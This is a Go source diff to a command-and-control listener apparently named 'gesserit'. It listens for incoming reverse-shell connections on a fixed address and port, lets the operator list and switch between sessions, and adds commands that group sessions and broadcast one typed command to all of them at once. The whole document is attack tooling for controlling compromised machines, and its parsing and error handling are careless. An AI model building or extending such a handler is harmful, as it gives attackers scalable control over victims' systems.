@@ -5,11 +5,13 @@ import (
 	"net"
 	"os"
 	"bufio"
+	"strings"
+	"strconv"
 )
 
 const (
 	HOST = "192.168.172.1"
-	PORT = "4444"
+	PORT = "42069"
 	TYPE = "tcp"
 )
 
@@ -31,6 +33,12 @@ func sendData(conn net.Conn, data string) {
 	_, err := conn.Write([]byte(data))
 	if err != nil {
 		fmt.Println("Error sending data", err.Error())
+	}
+}
+
+func groupSendData(groupSessionList []session, data string) {
+	for i:= 0; i < len(groupSessionList); i++ {
+		sendData(groupSessionList[i].connection, data);
 	}
 }
 
@@ -72,10 +80,17 @@ func list_sessions(sessions []session, currentSession int){
 	}
 }
 
+func print_group(sessions []session){
+	for i:= 0; i < len(sessions); i++ {
+		fmt.Println(sessions[i].sid, ": " + sessions[i].connection.RemoteAddr().String())
+	}
+}
+
 func main() {
 
 	currentSession := 0
 	sessions := make([]session, 0)
+	groupSessionList := make([]session, 0)
 
 	l, err := net.Listen(TYPE, HOST + ":" + PORT)
 	if err != nil {
@@ -90,14 +105,39 @@ func main() {
 	for {
 		reader := bufio.NewReader(os.Stdin)
 		cmd, _ := reader.ReadString('\n')
-		if cmd == "gesserit switch\n" {
-			list_sessions(sessions, currentSession)
-			fmt.Println("change session to?")
-			var newS int
-			fmt.Scanln(&newS)
+		if strings.Contains(cmd, "gesserit switch") {
+			st := strings.Fields(cmd)
+			newS, err := strconv.Atoi(st[2])
+			if err != nil {
+				fmt.Println("Session does not exist")
+			}
 			currentSession = newS
 		} else if cmd == "gesserit list\n"{
 			list_sessions(sessions, currentSession)
+		} else if cmd == "gesserit grouplist\n" {
+			print_group(groupSessionList)
+		} else if strings.Contains(cmd, "gesserit add"){
+			st := strings.Fields(cmd)
+			s, err := strconv.Atoi(st[2])
+			if err != nil {
+				fmt.Println("Session does not exist")
+			}
+			groupSessionList = append(groupSessionList, sessions[s])
+		} else if strings.Contains(cmd, "gesserit remove"){
+			st := strings.Fields(cmd)
+			s, err := strconv.Atoi(st[2])
+			if err != nil {
+				fmt.Println("Session does not exist")
+			}
+			for i:= 0; i < len(groupSessionList); i++ {
+				if groupSessionList[i].sid == s{
+					groupSessionList[i] = groupSessionList[len(groupSessionList) - 1]
+					groupSessionList = groupSessionList[:len(groupSessionList) - 1]
+				}
+			}
+		} else if strings.Contains(cmd, "gesserit groupsend"){
+			newCmd := cmd[18:]
+			groupSendData(groupSessionList, newCmd)
 		} else if cmd == "gesserit quit\n" {
 			os.Exit(3)
 		} else {
